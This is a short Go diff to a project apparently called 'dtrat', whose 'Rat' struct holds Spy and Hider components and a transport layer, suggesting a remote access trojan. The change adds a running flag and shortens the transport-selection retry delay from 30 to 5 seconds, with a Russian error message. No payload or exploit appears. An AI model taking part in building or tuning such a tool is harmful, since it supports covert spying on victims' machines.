@@ -8,6 +8,7 @@ import (
 	"dtrat/spy"
 	"dtrat/transport"
 	"fmt"
+	"sync/atomic"
 	"time"
 )
 
@@ -20,8 +21,9 @@ type Rat struct {
 	Hider     *hider.Hider
 	Spy       *spy.Spy
 
-	Config  config.Config
-	CloseCh chan (error)
+	isRunning atomic.Bool
+	Config    config.Config
+	CloseCh   chan (error)
 }
 
 func NewRat() (*Rat, error) {
@@ -37,7 +39,8 @@ func NewRat() (*Rat, error) {
 			break
 		}
 
-		time.Sleep(30 * time.Second)
+		fmt.Printf("Ошибка при выборе транспорта: %v. Повторная попытка через 5 секунд...\n", err)
+		time.Sleep(5 * time.Second)
 	}
 
 	if err != nil {
